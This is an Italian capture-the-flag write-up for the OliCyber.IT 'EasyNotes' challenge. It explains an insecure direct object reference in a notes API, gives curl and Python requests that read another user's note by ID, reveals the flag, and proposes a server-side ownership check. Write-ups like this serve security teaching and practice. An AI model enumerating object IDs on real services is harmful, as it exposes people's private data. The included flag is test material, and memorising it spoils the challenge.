# Writeup: EasyNotes

* **Piattaforma:** OliCyber.IT
* **Categoria:** Web Security / Access Control
* **Vulnerabilità:** IDOR (Insecure Direct Object Reference) / BOLA (Broken Object Level Authorization)
* **Target:** `[http://easynotes.challs.olicyber.it](http://easynotes.challs.olicyber.it)`
* **Flag:** `flag{I_us3d_t0_st34l_c00k13s}`

---

## 1. Descrizione della Challenge

> *"I'm pretty sure my friend posted something really embarrassing about himself on this website, can you find it?"*

L'applicazione consente agli utenti di creare e consultare note personali senza registrazione esplicita. All'accesso, il server rilascia un cookie di sessione contenente un **JWT** (con campi `userid`, `iat`, `exp`) per identificare le note appartenenti alla sessione corrente.

---

## 2. Analisi e Ricognizione

Esaminando il comportamento delle API:

* **Creazione nota (`POST /api/note`):** Riceve `{ "content": "..." }` e salva la nota associandola all'utente corrente identificato dal JWT.
* **Elenco note personali (`GET /api/notes`):** Restituisce unicamente le note collegate allo `userid` presente nel token di sessione.
* **Endpoint della singola risorsa (`GET /api/note/<id>`):** Permette di visualizzare una specifica nota tramite il suo identificatore numerico (`id`).

---

## 3. Vulnerabilità Identificata: IDOR / BOLA

L'endpoint `/api/note/<id>` soffre di un difetto di autorizzazione a livello di oggetto:

* Il server riceve l'identificativo della risorsa direttamente dal path URL (`/api/note/1`).
* Il backend interroga il database per ID senza verificare se la nota appartenga effettivamente all'utente che ha inviato la richiesta (o senza verificare la validità/proprietà del JWT per quello specifico record).

---

## 4. Risoluzione (Exploit)

Poiché l'amico menzionato nella descrizione ha pubblicato la prima nota sul servizio, è sufficiente richiedere la risorsa con indice `1`.

### Metodo 1: Tramite `curl`

```bash
curl -s http://easynotes.challs.olicyber.it/api/note/1

```

### Metodo 2: Tramite Python (`requests`)

```python
import requests

url = "http://easynotes.challs.olicyber.it/api/note/1"
response = requests.get(url)

print("Status:", response.status_code)
print("Risposta:", response.json())

```

---

## 5. Risultato e Flag

La richiesta restituisce il contenuto riservato della prima nota:

```json
{
  "content": "flag{I_us3d_t0_st34l_c00k13s}"
}

```

---

## 6. Remediation (Mitigazione)

Per proteggere l'endpoint, il backend deve verificare sempre che il proprietario della risorsa coincida con l'identità estratta dalla sessione/JWT prima di restituire il contenuto:

```python
# Esempio di fix lato server (Flask/SQLAlchemy):
note = Note.query.filter_by(id=note_id, userid=current_user_id).first()
if not note:
    return {"error": "Unauthorized or not found"}, 404
return {"content": note.content}

```
